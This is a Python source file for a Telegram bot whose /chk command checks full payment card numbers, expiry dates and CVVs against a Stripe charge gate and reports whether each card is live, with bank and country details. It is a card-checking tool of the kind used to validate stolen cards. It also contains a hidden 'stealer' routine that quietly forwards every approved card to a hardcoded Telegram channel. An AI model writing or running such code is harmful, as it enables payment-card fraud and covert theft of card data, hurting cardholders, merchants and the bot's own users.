import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import get_charge_resp
from .gate import create_cvv_charge
from BOT.tools.hit_stealer import send_hit_if_approved
from faker import Faker

STEALER_CHANNEL_ID = -1002549777556

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

@Client.on_message(filters.command("chk", [".", "/"]))
async def stripe_auth_cmd(client: Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(client, message)

        gateway = "Stripe Auth 💎"

        if checkall[0] is False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc is False:
            resp = f"""<b>
Gate Name: {gateway} ♻️
CMD: /chk

Message: No CC Found in your input ❌

Usage: /chk cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        secondchk = await client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()

        # Use async httpx client session
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as session:
            # Correctly await the async create_cvv_charge function
            result = await create_cvv_charge(fullcc, session)

        getresp = await get_charge_resp(result, user_id, fullcc)

        status = getresp["status"]
        response = getresp["response"]

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        thirdcheck = await client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        getbin = await get_bin_details(cc)

        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        currency = getbin[6] if len(getbin) > 6 else "Unknown"

        proxy_status = "Live ✨"
        bin_code = cc[:6]

        finalresp = f"""
{status}
━━━━━━━━━━━━━━━
[㊕] 𝗖𝗖 ➺ <code>{fullcc}</code>
[㊕] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➺ <i>{gateway}</i>
[㊕] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➺ ⤿ {response} ⤾
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[㊕] 𝗕𝗜𝗡 ➺ {bin_code}
[㊕] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➺ {brand} - {type} - {level}
[㊕] 𝗕𝗮𝗻𝗸 ➺ {bank}
[㊕] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➺ {country} - {flag} - {currency}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[㊕] Checked By ➺ <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[㊕] Dev ➺ ⏤‌‌‌‌ <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
━━━━━━━━━━━━━━━
[㊕] T/t ➺ [{time.perf_counter() - start:0.2f} seconds] | P/x ➺ [{proxy_status}]
"""
        await asyncio.sleep(0.5)
        await client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)

        await setantispamtime(user_id)
        await deductcredit(user_id)
        if status.lower().startswith("approved") or status.lower().startswith("charged"):
            await send_hit_if_approved(client, finalresp)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
